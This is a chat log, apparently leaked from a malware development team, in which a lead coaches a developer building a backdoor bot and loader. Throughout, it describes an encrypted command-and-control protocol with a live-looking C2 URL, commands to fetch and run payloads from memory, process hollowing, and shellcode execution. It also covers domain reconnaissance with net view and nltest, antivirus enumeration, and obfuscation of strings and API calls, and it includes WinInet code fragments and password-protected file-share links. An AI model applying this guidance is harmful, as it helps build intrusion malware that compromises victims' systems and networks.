2020-07-23T11:40:59 price -> mushroom
decimal representation of the md5 hash

2020-07-23T11:41:23 price -> mushroom
from identifier

2020-07-23T11:41:43 mushroom -> price
This is where the error comes in. The query should have a hex representation of the id.

2020-07-23T11:41:56 price -> mushroom
FUCK

2020-07-23T11:42:08 price -> mushroom
but the tz is decimal.

2020-07-23T11:42:25 mushroom -> price
Try using a utility to encrypt and decrypt a file with this hex key.

2020-07-23T11:42:39 mushroom -> price
Yes. They forgot to remove that.

2020-07-23T11:42:44 price -> mushroom
that you sent?

2020-07-23T11:42:54 mushroom -> price
There are no 128 bit numbers in C\C++.

2020-07-23T11:42:56 price -> mushroom
I almost gave up programming.

2020-07-23T11:42:59 mushroom -> price
Yes.

2020-07-23T11:43:39 price -> mushroom
also wasted time on the conversion procedure hex-deck

2020-07-23T11:44:20 mushroom -> price
int icookies = sizeof(cookies)+1; this is not needed, instead lstrlen(cookies)

2020-07-23T11:44:45 mushroom -> price
The zero character in this function does not need to be captured.

2020-07-23T11:45:14 price -> mushroom
reply came

2020-07-23T11:45:15 price -> mushroom
fkqq51B↩'

2020-07-23T11:46:07 mushroom -> price
Encrypted xor your id.

2020-07-23T11:46:16 price -> mushroom
that +1 - that's me hitting the tambourine

2020-07-23T11:46:39 price -> mushroom
let's break it down

2020-07-23T11:48:48
InternetOpen(L "WinInet Communication",INTERNET_OPEN_TYPE_PRECONFIG,NULL, NULL,0); here WinInet Communication can be omitted. Here I have internetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

2020-07-23T11:56:06 mushroom -> price
httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
        NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);

2020-07-23T11:56:27 mushroom -> price
INTERNET_FLAG_NO_COOKIES is required to pass cookies in the header.

2020-07-23T11:56:33 price -> mushroom
And isSecure?

2020-07-23T11:56:37 mushroom -> price
Otherwise Wininet will delete them.

2020-07-23T11:56:45 mushroom -> price
This is if https.

2020-07-23T11:57:14 price -> mushroom
How is it checked?

2020-07-23T11:57:33 mushroom -> price
By address or port (https, 443)

2020-07-23T11:58:46 mushroom -> price
Query sent without errors, read the response code first:
if (req)
    {
        DWORD resCode = 0;
        DWORD resCodeSize = sizeof(DWORD);
        if (!wininet.httpQueryInfo(req, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &resCode,
            &resCodeSize, NULL))
        {
            DWORD err = kernel32.getLastError();
            debug_printf(TEXT("Can't query response info, error: %u\n"), err);
            wininet.internetCloseHandle(req);
            kernel32.setLastError(err);
            return NULL;
        }

        if (resCode != 200)
        {
            debug_printf(TEXT("Error, response code is %u\n"), resCode);
            wininet.internetCloseHandle(req);
            kernel32.setLastError(ERROR_INTERNET_EXTENDED_ERROR);
            return NULL;
        }

        debug_printf(TEXT("Response code is %u\n"), resCode);
    }

2020-07-23T11:59:00 mushroom -> price
Like this, anything not 200 is considered an error.

2020-07-23T11:59:46 mushroom -> price
Read. You can now read the answer yourself:
internetReadFile(req, resBuffer, resBufferSize, &readed)

2020-07-23T12:00:17 mushroom -> price
Everything you and you are sent all encrypted xor your id.

2020-07-23T12:01:31 price -> mushroom
and why is my decoded answer so strange?

2020-07-23T12:01:33 price -> mushroom
-‰x

2020-07-23T12:02:16 mushroom -> price
There must be a problem with the key.

2020-07-23T12:02:23 mushroom -> price
Use the utility to check.

2020-07-23T12:02:41 price -> mushroom
Is the key hash or straight ID?

2020-07-23T12:02:51 mushroom -> price
Hash.

2020-07-23T12:02:59 mushroom -> price
As bytes, of course.

2020-07-23T12:03:07 price -> mushroom
hexHash

2020-07-23T12:03:19 mushroom -> price
Just hash.

2020-07-23T12:03:26 mushroom -> price
As bytes.

2020-07-23T12:03:34 price -> mushroom
gjyzk

2020-07-23T12:03:37 price -> mushroom
got it

2020-07-23T12:03:42 mushroom -> price
In the utility, look there hex is converted to bytes.

2020-07-23T12:12:37 price -> mushroom
got 0 302

2020-07-23T12:12:46 price -> mushroom
what does that mean?

2020-07-23T12:13:10 mushroom -> price
Command 0. See the ToR.

2020-07-23T12:13:20 mushroom -> price
So call back in 302 sec.

2020-07-23T12:13:32 price -> mushroom
I know the ToR by heart, I was just asking

2020-07-23T12:13:45 price -> mushroom
and call back again get /2?

2020-07-23T12:13:55 mushroom -> price
Yes.

2020-07-23T12:14:13 price -> mushroom
is this communication visible on the server?

2020-07-23T12:14:19 mushroom -> price
Yes.

2020-07-23T12:14:25 price -> mushroom
see

2020-07-23T12:14:39 mushroom -> price
Your bot should appear there.

2020-07-23T12:14:50 price -> mushroom
appeared

2020-07-23T12:15:06 mushroom -> price
Is the band there?

2020-07-23T12:15:12 mushroom -> price
Reflected.

2020-07-23T12:15:14 price -> mushroom
yes

2020-07-23T12:15:34 mushroom -> price
That means everything is correct. Do command 1 completely.

2020-07-23T12:15:38 price -> mushroom
Yes everything on the hex.

2020-07-23T12:15:42 price -> mushroom
doing

2020-07-23T12:15:56 price -> mushroom
And the xor should be given to bingHash

2020-07-23T12:16:01 price -> mushroom
there are no trunks there.

2020-07-23T12:16:06 price -> mushroom
characters

2020-07-23T12:16:43 mushroom -> price
I don't get it.

2020-07-23T12:17:50 price -> mushroom
Well, to get the answer out of what came in, I have brushed off the binary hash result of CryptGetHashParam

2020-07-23T12:18:06 price -> mushroom
he's like this DKB8 ##'
MRљoce'.

2020-07-23T12:18:27 mushroom -> price
What's the question?

2020-07-23T12:18:46 price -> mushroom
no question

2020-07-23T12:18:48 mushroom -> price
Everything has to be encrypted with a binary hash.

2020-07-23T12:19:07 mushroom -> price
OK.

2020-07-23T13:46:46 mushroom -> price
How do you do command 1 completely. On GitLab, start two projects bd6 for the bot, dl6 for the loader, give me access to them, and upload there, I'll watch periodically.

2020-07-23T13:47:03 price -> mushroom
ok

2020-07-24T07:50:18 price -> mushroom
hi

2020-07-28T14:40:39 mushroom -> price
What has been done so far? You only have 8 hours of labor in redmine.

2020-07-28T14:43:01 price -> mushroom
I'm debugging a program with input and output hijacking now /*read the ToR, came across it - started debugging*/. I will finish command 1 today and report back. I am working.

2020-07-28T14:45:03 mushroom -> price
Upload projects to GitLab like I said. Write in redmine every day labor and what you're doing, not when you finish any task.

2020-07-28T14:46:37 price -> mushroom
Got it, I'll do it.

2020-07-29T05:25:20 price -> mushroom
backdoor project on gitlab downloaded at https://n4iaacb37wmqclht.onion/price/backdoor.git

2020-07-29T07:10:10 price -> mushroom
backdoor project on gitlab downloaded at https://n4iaacb37wmqclht.onion/price/backdoor.git

2020-07-29T13:43:27 mushroom -> price
Hi. Rename the project to bd6.

2020-07-29T13:43:45 price -> mushroom
ok

2020-07-29T13:44:34 price -> mushroom
how to make a printf in win32, I am trying WriteConsole now

2020-07-29T13:44:50 price -> mushroom
,

2020-07-29T13:44:53 price -> mushroom
?

2020-07-29T13:44:56 mushroom -> price
No way.

2020-07-29T13:45:04 mushroom -> price
Use printf

2020-07-29T13:45:14 mushroom -> price
There is no replacement in Win32.

2020-07-29T13:45:17 price -> mushroom
debug_print

2020-07-29T13:45:31 mushroom -> price
This is a homemade replacement.

2020-07-29T13:45:31 price -> mushroom
ok

2020-07-29T13:46:21 mushroom -> price
Plus debug_printf only in Debug and Release builds, in Release_nologs it is disabled by macro.

2020-07-29T13:47:07 price -> mushroom
and I have to log messages via wininet?

2020-07-29T13:47:16 price -> mushroom
is there such a functionality?

2020-07-29T13:47:23 price -> mushroom
I've seen

2020-07-29T13:47:35 mushroom -> price
What messages?

2020-07-29T13:47:39 mushroom -> price
/4

2020-07-29T13:47:44 mushroom -> price
These?

2020-07-29T13:47:53 price -> mushroom
yes

2020-07-29T13:48:24 mushroom -> price
For now, just send the address you are using and the program version when connecting to the server.

2020-07-29T13:48:37 mushroom -> price
It's the same every time I reconnect.

2020-07-29T13:48:42 price -> mushroom
ok

2020-07-29T13:48:58 mushroom -> price
Every hour send the running time in sec or msec and version.

2020-07-29T13:49:20 mushroom -> price
Nothing else needs to be sent from the messages for now.

2020-07-29T13:49:26 price -> mushroom
and the version should drive itself?

2020-07-29T13:49:47 price -> mushroom
what format?

2020-07-29T13:49:51 mushroom -> price
Yourself.

2020-07-29T13:49:59 price -> mushroom
ok

2020-07-29T13:50:01 mushroom -> price
Whatever you want for now.

2020-07-29T13:50:53 price -> mushroom
Who will make a test32.exe?

2020-07-29T13:51:11 price -> mushroom
I already did, billet

2020-07-29T13:51:23 mushroom -> price
These files are not on the server?

2020-07-29T13:51:49 price -> mushroom
I don't know, I don't remember, but I was interested and watched every team

2020-07-29T13:51:56 mushroom -> price
There's a bunch of stuff that got loaded when they tested it.

2020-07-29T13:52:09 mushroom -> price
You can make your own.

2020-07-29T13:52:24 price -> mushroom
ok

2020-07-29T13:52:35 mushroom -> price
There are testoutput32.exe and testoutput64.exe on the server

2020-07-29T13:52:54 mushroom -> price
Infinitely output TEST in stdout

2020-07-29T13:53:48 price -> mushroom
Got it, about the output of the TEST read

2020-07-29T13:55:18 mushroom -> price
Right now, the priority is just to make a command to download the launch file. That's basically what they use.

2020-07-29T13:55:34 price -> mushroom
exe? dll?

2020-07-29T13:55:41 mushroom -> price
exe

2020-07-29T13:55:47 price -> mushroom
ok

2020-07-29T13:55:51 mushroom -> price
The dll just runs.

2020-07-29T13:56:06 mushroom -> price
And you also need the exe without saving to disk.

2020-07-29T13:56:09 price -> mushroom
I just spent all day yesterday on this

2020-07-29T13:56:23 price -> mushroom
holoving?

2020-07-29T13:56:28 mushroom -> price
Yes.

2020-07-29T13:56:35 price -> mushroom
ok

2020-07-29T13:56:55 mushroom -> price
For now, forget about doppelganging, it 100% does not work on Win 10.

2020-07-29T13:58:03 price -> mushroom
thanks for the heads up

2020-07-29T13:59:39 mushroom -> price
As an example:
Download: https://qaz.im/load/QKDary/5GrZYf
Delete: https://qaz.im/index.php?a=delete&q=919812058
Password: EB?F\Key:gQy>$sh_

2020-07-29T14:00:48 price -> mushroom
accepted

2020-07-29T14:57:58 mushroom -> price
Give me better access to your projects. I can't clone bd6, and I can't look at the code.

2020-07-29T15:16:29 mushroom -> price
You have 8 hours of only costs so far on redmine. Remind you to write them every day.

2020-07-29T15:18:14 price -> mushroom
Ok, I'll give the master

2020-07-29T15:18:59 price -> mushroom
With costs is a problem, I don't know how to write them. Not intuitively.But I want to learn.

2020-07-29T15:19:29 price -> mushroom
But otherwise, yes.  My code's starting to flow like a song right now.  And I think it will be something to write about.

2020-07-29T15:19:35 mushroom -> price
As long as you've been sitting at work, that's how long you should write.

2020-07-29T15:20:00 price -> mushroom
It's not that simple. It checks the value and you can't write anything else.

2020-07-29T15:20:12 price -> mushroom
I even wrote at 0 hours in some situation.

2020-07-29T15:20:48 price -> mushroom
Again, for two days (or three) I wrote a plan, but how do I write it off?

2020-07-29T15:21:25 mushroom -> price
Add labor costs to the task.

2020-07-29T15:21:56 price -> mushroom
But I'm sitting around the clock because there's a theme. Okay, I'll take a closer look.

2020-07-29T15:25:29 price -> mushroom
promoted

2020-08-03T09:28:14 mushroom -> price
Hi. Looking at your project. Where is the execution of command 1 there?

2020-08-03T09:28:53 price -> mushroom
Are you looking at gitlab?

2020-08-03T09:28:57 price -> mushroom
hi

2020-08-03T09:29:12 mushroom -> price
Yes cloned myself.

2020-08-03T09:29:57 price -> mushroom
I haven't added it yet, but it's done and I'm putting the data on the server.

2020-08-03T09:30:27 price -> mushroom
Accordingly, I'll put it in today in the near future.

2020-08-03T09:30:38 mushroom -> price
Okay.

2020-08-03T09:30:51 price -> mushroom
I'm hooked on holoving and startups of all kinds. There are questions.

2020-08-03T09:31:13 price -> mushroom
1. I get 10,11 packages from the server

2020-08-03T09:31:23 price -> mushroom
everything decrypts except the URI

2020-08-03T09:31:52 price -> mushroom
It's kind of confusing, I guess there's some other decoding required?

2020-08-03T09:32:01 price -> mushroom
2. question

2020-08-03T09:33:38 price -> mushroom
to run some batch script, only the last field to enter, the script itself, why another one in which you can't put anything (or is it just to put everything in the script field from the batch on disk after browsing?)

2020-08-03T09:35:26 mushroom -> price
Script parameters script parameters, used only when the script is run with saving to disk.

2020-08-03T09:35:47 price -> mushroom
3. question - you threw me a .c and .h processhelper - is it an action reference or working fragment (missing parts of different types - #include "strobfuscator.h"
#include "tdebug.h"

2020-08-03T09:35:48 mushroom -> price
When the script runs without saving to disk they should be ignored.

2020-08-03T09:36:04 mushroom -> price
Excerpt.

2020-08-03T09:36:46 mushroom -> price
_STR, _WCS, _TSTR, debug_printf can be removed.

2020-08-03T09:36:54 mushroom -> price
This is an obfuscation.

2020-08-03T09:37:27 mushroom -> price
And debug output, you can replace it with your own.

2020-08-03T09:37:59 price -> mushroom
The main thing - that the URI lkz exe & dll are not clear to me, I specify the program in the inspector and the link comes apparently obfuscated

2020-08-03T09:38:39 price -> mushroom
URI for exe&dll

2020-08-03T09:39:12 mushroom -> price
Here are the debug and strobfuscator:
Download: https://qaz.im/load/Gii34k/Ye859t
Delete: https://qaz.im/index.php?a=delete&q=169681237
Password: xjly1u#qxzr50IfK.

2020-08-03T09:39:13 price -> mushroom
everything else in the command is fine, the command line, the mask, the delay and the command code

2020-08-03T09:40:01 mushroom -> price
Do you select the file that is sent?

2020-08-03T09:40:22 price -> mushroom
how do you choose?

2020-08-03T09:40:40 mushroom -> price
Select/Upload execution file

2020-08-03T09:42:10 price -> mushroom
what does it look like in C++ in more detail?

2020-08-03T09:43:05 mushroom -> price
I mean, on the web page, which file do you choose to run?

2020-08-03T09:43:22 price -> mushroom
yes, on the server

2020-08-03T09:43:43 mushroom -> price
Select Run exe, Run from memory, Select/Upload execution file

2020-08-03T09:43:48 price -> mushroom
When I select the .xe command and fill in the parameters

2020-08-03T09:44:06 price -> mushroom
I see, I'll take a look

2020-08-03T09:44:11 mushroom -> price
And that the link comes left?

2020-08-03T09:44:17 price -> mushroom
yes

2020-08-03T09:44:35 price -> mushroom
There's nothing wrong around here, but there's a hex in the middle.

2020-08-03T09:45:02 mushroom -> price
There's a link, it's just a path, you have to pin it to the server address you're currently using.

2020-08-03T09:46:01 price -> mushroom
Where is the attachment made?

2020-08-03T09:47:45 mushroom -> price
You attach it yourself. Get url /path/1.exe for example and add it to https://125.125.125.125:443 for example https://125.125.125.125:443/path/1/exe

2020-08-03T09:49:32 price -> mushroom
Check this out - just ran it now.

2020-08-03T09:49:34 price -> mushroom
10 2 60 1 /57396fd3c3f052de4c8d0ceb1dfa32db/fs7Q08KetdMXFD7TaUi8QYVjFZk_wkVR6vRQwi6g a b c

2020-08-03T09:49:40 price -> mushroom
This came

2020-08-03T09:50:09 mushroom -> price
a b c is what?

2020-08-03T09:50:23 price -> mushroom
options - command line

2020-08-03T09:50:41 price -> mushroom
are set on the server

2020-08-03T09:50:46 mushroom -> price
Try it without them.

2020-08-03T09:50:57 mushroom -> price
Maybe it's a glitch on the server.

2020-08-03T09:51:03 mushroom -> price
Try it without them.

2020-08-03T09:51:14 price -> mushroom
Trying

2020-08-03T09:52:30 price -> mushroom
here's without them

2020-08-03T09:52:31 price -> mushroom
10 2 60 1 /57396fd3c3f052de4c8d0ceb1dfa32db/7p5d-k98pVdzeK5pWSP4FODtrcI19ZqHmop2x-B

2020-08-03T09:52:53 price -> mushroom
And the line really came out different.

2020-08-03T09:52:56 price -> mushroom
But they are not.

2020-08-03T09:53:25 price -> mushroom
almost another one, the beginning is similar.

2020-08-03T09:53:56 mushroom -> price
That's right.

2020-08-03T09:54:02 mushroom -> price
http://51.89.125.28:12232/57396fd3c3f052de4c8d0ceb1dfa32db/7p5d-k98pVdzeK5pWSP4FODtrxcI19ZqHmop2x-B

2020-08-03T09:54:19 price -> mushroom
got it

2020-08-03T09:54:27 mushroom -> price
I added GET request to address, got file.

2020-08-03T09:55:03 price -> mushroom
and encrypted as well

2020-08-03T09:55:09 price -> mushroom
great

2020-08-03T09:55:23 mushroom -> price
With the command line is also correct, where a b c.

2020-08-03T09:56:30 price -> mushroom
But I for example through the bat channel I request systeminfo and I get abracadabra on the russian parts of the answer, it - ignore?

2020-08-03T09:56:47 price -> mushroom
Or is there a way to chcp it?

2020-08-03T09:57:08 price -> mushroom
but not pretty with abra

2020-08-03T09:58:14 mushroom -> price
Encode everything you send to the server in UTF-8.

2020-08-03T09:58:42 price -> mushroom
I also tried post /3 to do post /4, but I did not see any reaction on the server

2020-08-03T10:00:59 mushroom -> price
I could do it now.

2020-08-03-03T10:01:12 mushroom -> price
Смотри c4ca4238a0b923820dcc509a6f75849b

2020-08-03T10:02:00 price -> mushroom
here believed in you!

2020-08-03T10:02:14 mushroom -> price
2 times OK.

2020-08-03T10:02:15 price -> mushroom
But he was talking about himself.

2020-08-03T10:02:23 mushroom -> price
Same as /3

2020-08-03T10:02:28 mushroom -> price
It's done.

2020-08-03T10:02:44 price -> mushroom
twice in a row? "OKOK?"

2020-08-03T10:03:00 price -> mushroom
I thought /4 was like /3

2020-08-03T10:03:10 mushroom -> price
No I sent two OK messages in a row to check.

2020-08-03T10:03:21 price -> mushroom
what if a longer text when not OK?

2020-08-03T10:03:36 mushroom -> price
Whatever text you want you can send there.

2020-08-03T10:03:40 price -> mushroom
yes -there are two

2020-08-03T10:04:00 mushroom -> price
Encoded in UTF-8, encrypted and sent.

2020-08-03T10:04:04 price -> mushroom
Ok, I'll look again more closely.

2020-08-03T10:04:30 mushroom -> price
And put it in the repository.

2020-08-03T10:04:41 price -> mushroom
ok

2020-08-03T10:30:36 mushroom -> price
I forgot to tell you, processhelper is one-to-one, don't put it in your program, it's just an example.

2020-08-03T10:31:17 mushroom -> price
strobfusactor and tdebug can be inserted, it will be needed later.

2020-08-03T10:31:29 price -> mushroom
That's what I asked, I tried to put it in a separate project, but it's a lot of dust to swallow

2020-08-03T10:31:43 price -> mushroom
so I switched to contemplation

2020-08-03T10:32:13 price -> mushroom
code sense

2020-08-03T10:32:42 mushroom -> price
It works. I gave you the missing files.

2020-08-03T10:33:06 price -> mushroom
ok

2020-08-03T10:33:11 mushroom -> price
Or you can remove or comment out debug_* and _STR, _WCS, _TSTR.

2020-08-03T10:34:07 mushroom -> price
And replace all that kernel32.createProcess stuff with CreateProcess.

2020-08-03T10:34:23 price -> mushroom
I already replaced, 144 replacements

2020-08-03T10:34:34 mushroom -> price
I'll give you an example of WinApi call obfuscation right away, though.

2020-08-03T10:34:38 price -> mushroom
for one of the functions only

2020-08-03T10:36:35 mushroom -> price
Download: https://qaz.im/load/4i4rfa/Zkf77a
Delete: https://qaz.im/index.php?a=delete&q=400243054
Password: _TE|p/w "SfG5Q}d<s

2020-08-03T10:37:42 price -> mushroom
took

2020-08-03T15:03:26 price -> mushroom
Hi

2020-08-03T15:03:41 price -> mushroom
I found why my 4 command did not go through

2020-08-03T15:04:02 price -> mushroom
Well, I got stuck (but not only on this trifle)

2020-08-03T15:04:34 price -> mushroom
Turns out to be a 500 error return when passing what comes out of the Cyrillic

2020-08-03T15:04:48 price -> mushroom
That is, English is sent, but Russian is not

2020-08-03T15:06:11 price -> mushroom
in particular, I am also debugging the 12th command and there on request dir the russian diagnostics drop out and that is why the command does not reach

2020-08-03T15:06:41 mushroom -> price
Encode it in UTF-8 then it will work.

2020-08-03T15:06:44 price -> mushroom
If you call something neutral like whoami (I have who in English), it works

2020-08-03T15:06:57 price -> mushroom
I've done that too.

2020-08-03T15:07:13 price -> mushroom
I have an 866 code (I asked for it)

2020-08-03T15:07:49 price -> mushroom
There is a memory error 0хc00005

2020-08-03T15:08:09 price -> mushroom
on conversion 1251 65001

2020-08-03T15:08:47 price -> mushroom
Okay, got it, thank you.

2020-08-03T15:09:00 mushroom -> price
There you must first convert to unicode, then from unicode to utf-8

2020-08-03T15:09:08 price -> mushroom
I know

2020-08-03T15:09:41 price -> mushroom
When I convert to multibyte a memory overrun will pop up

2020-08-03T15:09:58 price -> mushroom
Thank you, the path is pointed out.

2020-08-03T15:10:03 price -> mushroom
I ran

2020-08-03T15:11:09 mushroom -> price
As an example:
_Success_(return != 0)
BOOL multiByteToUtf8(_In_ UINT codepage, _In_reads_bytes_(multiByteStrSize) PSTR multiByteStr,
    int multiByteStrSize, _Outptr_ PSTR * utf8Str, int* utf8StrSize)
{
    int cch = MultiByteToWideChar(codepage, 0, multiByteStr, multiByteStrSize, NULL, 0);
    PWSTR tmpStr = (PWSTR)HeapAlloc(GetProcessHeap(), 0, cch * sizeof(WCHAR));
    if (!tmpStr)
        return FALSE;

    cch = MultiByteToWideChar(codepage, 0, multiByteStr, multiByteStrSize, tmpStr, cch);

    int cb = WideCharToMultiByte(CP_UTF8, 0, tmpStr, cch, NULL, 0, NULL, NULL);
    PSTR result = (PSTR)HeapAlloc(GetProcessHeap(), 0, cb);
    if (!result)
    {
        HeapFree(GetProcessHeap(), 0, tmpStr);
        return FALSE;
    }

    cb = WideCharToMultiByte(CP_UTF8, 0, tmpStr, cch, result, cb, NULL, NULL);
    HeapFree(GetProcessHeap(), 0, tmpStr);

    *utf8Str = result;
    *utf8StrSize = cb;
    return TRUE;
}

2020-08-03T15:11:57 price -> mushroom
Thank you I will take it into account

2020-08-12T13:07:25 mushroom -> price
When you're free, post your progress, what's done.

2020-08-12T13:46:44 price -> mushroom
ok

2020-08-12T13:47:40 price -> mushroom
everything is clear now, but practically around the clock solving problems with the environment and the conditions of the triggering of this or that function

2020-08-12T13:48:26 price -> mushroom
so there is a lot of work and few questions, not even time to fill out the tracker, but I will post everything today in hindsight

2020-08-12T13:49:42 price -> mushroom
and so, while writing, worked off the bat/PS via pip, found a version on antivirus (a lot of mushrooming since the parameter was lost when I switched to securitycenter2)

2020-08-12T13:50:23 price -> mushroom
and the rest on the general device for working out the rules of the TK (errors, execution times, etc.)

2020-08-12T13:51:19 price -> mushroom
not clear right away, why do you need to run scripts through a file if you can do it through a PIP?

2020-08-12T13:57:11 mushroom -> price
I see. I think you need to run some heavily obfuscated script through a file, not sure that it will pass through the pipeline.

2020-08-12T13:57:38 price -> mushroom
got it

2020-08-12T13:57:42 mushroom -> price
Write in simpler terms what commands are done so far.

2020-08-12T13:59:01 price -> mushroom
except for holoving everything, pretty much.

2020-08-12T13:59:33 price -> mushroom
I'm combing everything to make it look nice.

2020-08-12T14:00:06 mushroom -> price
0, 1, 10, 11, 12, 13, 14, 15, 16, 17, 100

2020-08-12T14:00:11 mushroom -> price
Like this?

2020-08-12T14:00:50 mushroom -> price
Or are any of them missing from your TOR?

2020-08-12T14:01:23 mushroom -> price
We may have different TORs, I have an older one.

2020-08-12T14:01:42 price -> mushroom
looking at now

2020-08-12T14:01:51 mushroom -> price
In short, what commands do you have in your TK and which ones are made?

2020-08-12T14:02:02 PM price -> mushroom
well 11 has not tried, although it is clear

2020-08-12T14:02:23 price -> mushroom
10 - holoving didn't try it, but it's clear

2020-08-12T14:02:40 price -> mushroom
12, 13 fully debugged

2020-08-12T14:03:34 price -> mushroom
14-reset-all clear, that's exactly what I'm doing (to have access to a long running process)

2020-08-12T14:03:49 price -> mushroom
15 - done

2020-08-12T14:04:08 price -> mushroom
16-load understandable

2020-08-12T14:04:57 price -> mushroom
17-shelcode in the hex will come, I will convert it into a binary and run (all clear)

2020-08-12T14:05:27 price -> mushroom
100 -delete from the system (it was a question, and it is unclear what it is)

2020-08-12T14:05:51 mushroom -> price
Shel code must be in SEH, otherwise all> will fail because shel code can be incorrectly written.

2020-08-12T14:06:14 price -> mushroom
That is to intercept the interrupt

2020-08-12T14:06:18 mushroom -> price
To remove yourself from the system is to remove your bootloader.

2020-08-12T14:06:18 price -> mushroom
?

2020-08-12T14:06:41 price -> mushroom
run a third-party process and kill and deletefail?

2020-08-12T14:06:51 mushroom -> price
Yes. The exception is native to Windows. C++ doesn't intercept them.

2020-08-12T14:07:02 price -> mushroom
And remove from the schedule?

2020-08-12T14:07:20 price -> mushroom


2020-08-12T14:07:26 price -> mushroom
ok, got it

2020-08-12T14:07:27 PM mushroom -> price
About 100, delete your bootloader and be done.

2020-08-12T14:08:04 PM mushroom -> price
You haven't started doing the loader yet, command 100 for now without the loader it will just end.

2020-08-12T14:08:13 price -> mushroom
I have not thought about the loader yet, I read what it says in the TOR, but for now I am working in standalone mode bd6

2020-08-12T14:08:44 price -> mushroom
well then write what exit we did

2020-08-12T14:09:43 mushroom -> price
So that leaves hollowing for 10, reset for a running process if it has a timeout, shell code, file load. Right?

2020-08-12T14:09:45 price -> mushroom
If you have bd2 and I have bd6, then there are more than 6 versions of this bot?

2020-08-12T14:09:56 price -> mushroom
yes

2020-08-12T14:10:02 price -> mushroom
but here's a question

2020-08-12T14:10:30 price -> mushroom
net view goes for 50 sec and iimout 30, what should I do?

2020-08-12T14:10:36 price -> mushroom
timeout

2020-08-12T14:10:55 price -> mushroom
And in general, the gathering on command 1

2020-08-12T14:11:05 mushroom -> price
There is no timeout for command 1.

2020-08-12T14:11:38 mushroom -> price
This is not a timeout, but the time after which to request a new command, after the end of command 1.

2020-08-12T14:12:05 price -> mushroom
got it

2020-08-12T14:12:21 price -> mushroom
wait for all processes to complete and then time out again?

2020-08-12T14:14:02 mushroom -> price
Command 1 turns out to be a blocking command. Executed it completely (including the necessary processes), send the result and wait for this time that came in this command, wait, request a new command.

2020-08-12T14:14:04 price -> mushroom
This command also works in cmd.exe, but in createprocess it does not find the file - error 2

2020-08-12T14:14:25 price -> mushroom
clear about team 1

2020-08-12T14:14:58 price -> mushroom
I wasted a lot of time building antiviruses with the security center disabled

2020-08-12T14:15:19 price -> mushroom
There were questions about the version of the antivirus, too

2020-08-12T14:15:49 price -> mushroom
I collect them via wmi

2020-08-12T14:16:36 mushroom -> price
This command also works in cmd.exe, but in createprocess it does not find the file - error 2

2020-08-12T14:16:45 price -> mushroom
yes

2020-08-12T14:16:46 mushroom -> price
What's that about?

2020-08-12T14:17:57 price -> mushroom
this was before, now I have a different version of bat/PS execution has not checked yet, but really all the other commands worked (not the server so they wrote no information) and this command wrote error 2

2020-08-12T14:18:29 price -> mushroom
will find out in due course, of course, just out of curiosity I asked

2020-08-12T14:18:37 mushroom -> price
net view /all /domain

2020-08-12T14:18:42 mushroom -> price
This command?

2020-08-12T14:19:19 price -> mushroom
these worked, it said it was not a server, but the command trust=result of the command nltest /domain_trusts /all_trusts

2020-08-12T14:19:35 mushroom -> price
You don't have to run it through something. Just CreateProcess net view /all /domain

2020-08-12T14:19:50 mushroom -> price
Does that make it work?

2020-08-12T14:19:51 price -> mushroom
And the trust?

2020-08-12T14:20:12 mushroom -> price
Everything in command 1 can be run on its own.

2020-08-12T14:20:12 price -> mushroom
so everything works, does not find the environment, I just have winduz

2020-08-12T14:20:40 price -> mushroom
got it I'll try it

2020-08-12T14:20:57 mushroom -> price
I think because these utilities are all in System32.

2020-08-12T14:21:07 price -> mushroom
I found everything

2020-08-12T14:21:16 price -> mushroom
And put the full path

2020-08-12T14:21:29 price -> mushroom
I checked with a simple command line - it works

2020-08-12T14:21:37 PM mushroom -> price
They don't need to be system. Like cmd for example.

2020-08-12T14:21:55 price -> mushroom
in the criateprocess - last error 2 - no file

2020-08-12T14:22:09 price -> mushroom
I'll give it a try, thank you.

2020-08-12T14:22:33 price -> mushroom
here's more

2020-08-12T14:23:16 price -> mushroom
If I put cmd.exe /c in bat - does not work, without /c - works!

2020-08-12T14:23:38 mushroom -> price
You have to cmd /c \".\"

2020-08-12T14:23:41 price -> mushroom
In createprocess when I run cmd

2020-08-12T14:23:57 mushroom -> price
Use the command for cmd in quotes.

2020-08-12T14:24:20 mushroom -> price
There are spaces in there.

2020-08-12T14:24:26 price -> mushroom
I'm putting the command in a bundle.

2020-08-12T14:24:45 mushroom -> price
And you're talking about team 10.

2020-08-12T14:24:49 price -> mushroom
that is cmd /c \". put in and put out \"

2020-08-12T14:25:08 price -> mushroom
no - this is command 12

2020-08-12T14:25:27 price -> mushroom
ok,, there is a direction to check

2020-08-12T14:25:28 mushroom -> price
If via pip, just cmd

2020-08-12T14:25:34 price -> mushroom
But it works without /c

2020-08-12T14:25:39 price -> mushroom
here you go

2020-08-12T14:25:51 mushroom -> price
That's what I'm saying, through pip just cmd

2020-08-12T14:26:07 mushroom -> price
And PowerShell -Command -

2020-08-12T14:26:17 price -> mushroom
that's right PS nnorm

2020-08-12T14:26:17 mushroom -> price
If via pip.

2020-08-12T14:26:44 price -> mushroom
the letter C can even be a small letter

2020-08-12T14:27:02 price -> mushroom
Or just with

2020-08-12T14:27:08 price -> mushroom
-с -

2020-08-12T14:27:25 mushroom -> price
I will know.

2020-08-12T14:27:56 price -> mushroom
external IP to bypass all sites (in case someone dropped out)

2020-08-12T14:28:27 price -> mushroom
I get it here http://checkip.dyndns.org

2020-08-12T14:28:32 mushroom -> price
Don't. Doesn't work, it's an empty field.

2020-08-12T14:28:53 mushroom -> price
You can do a couple, but you don't have to.

2020-08-12T14:29:12 price -> mushroom
there policy is no more than once every 10 minutes

2020-08-12T14:29:18 mushroom -> price
If what failed to get an empty field then pass in the response for command 1.

2020-08-12T14:29:21 price -> mushroom
I was thinking.

2020-08-12T14:29:53 price -> mushroom
But about the version of antivirus - you can also blank the field or get to the information

2020-08-12T14:30:14 mushroom -> price
Empty can.

2020-08-12T14:30:17 price -> mushroom
now only through the definition of the program launch AV and from it I take the version of the file

2020-08-12T14:30:27 mushroom -> price
The main thing is to have them all.

2020-08-12T14:30:38 price -> mushroom
used to have this information now not, but there is a starting address

2020-08-12T14:30:39 mushroom -> price
Fields.

2020-08-12T14:30:49 price -> mushroom
the fields are clear

2020-08-12T14:31:23 price -> mushroom
For example, for me in the output now only shows Avast and Defender somewhere hiding, what to do?

2020-08-12T14:31:53 mushroom -> price
Whatever you get is what you send.

2020-08-12T14:31:56 price -> mushroom
